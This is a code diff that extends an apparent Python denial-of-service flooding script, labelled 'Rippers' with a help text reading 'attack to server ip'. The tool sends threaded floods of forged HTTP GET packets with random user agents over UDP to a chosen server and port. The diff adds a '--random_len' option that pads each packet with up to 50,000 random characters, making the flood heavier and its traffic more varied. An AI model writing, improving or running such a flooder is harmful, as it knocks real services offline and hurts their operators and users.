@@ -1,5 +1,5 @@
 from optparse import OptionParser
-import time, sys, socket, threading, random, os
+import time, sys, socket, threading, random, string
 
 
 def user_agent():
@@ -31,12 +31,27 @@ def headers():
     headers.close()
 
 
+def get_random_string(len_from, len_to):
+    # Random string with different length
+    length = random.randint(len_from, len_to)
+    letters = string.ascii_lowercase
+    result_str = ''.join(random.choice(letters) for i in range(length))
+    return result_str
+
+
 def down_it():
     i = 1
     while True:
+        if random_packet_len:
+            extra_data = get_random_string(0, 50000)
+        else:
+            extra_data = ''
         packet = str(
-            "GET / HTTP/1.1\nHost: " + host + "\n\n User-Agent: " + random.choice(uagent) + "\n" + data).encode(
-            'utf-8')
+            "GET / HTTP/1.1\nHost: " + host
+            + "\n\n User-Agent: "
+            + random.choice(uagent)
+            + "\n" + data
+            + "\n\n" + extra_data).encode('utf-8')
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         try:
             s.sendto(packet, (host, int(port)))
@@ -74,11 +89,14 @@ def get_parameters():
     global port
     global thr
     global item
+    global random_packet_len
     optp = OptionParser(add_help_option=False, epilog="Rippers")
     optp.add_option("-s", "--server", dest="host", help="attack to server ip -s ip")
     optp.add_option("-p", "--port", type="int", dest="port", help="-p 80 default 80")
     optp.add_option("-t", "--threads", type="int", dest="threads", help="default 100")
     optp.add_option("-h", "--help", dest="help", action='store_true', help="help you")
+    optp.add_option("-r", "--random_len", type="int", dest="random_packet_len",
+                    help="Send random packets with random length")
     opts, args = optp.parse_args()
     if opts.help:
         usage()
@@ -95,6 +113,11 @@ def get_parameters():
         thr = 100
     else:
         thr = opts.threads
+
+    if opts.random_packet_len:
+        random_packet_len = True
+    else:
+        random_packet_len = False
 
 
 def check_host():
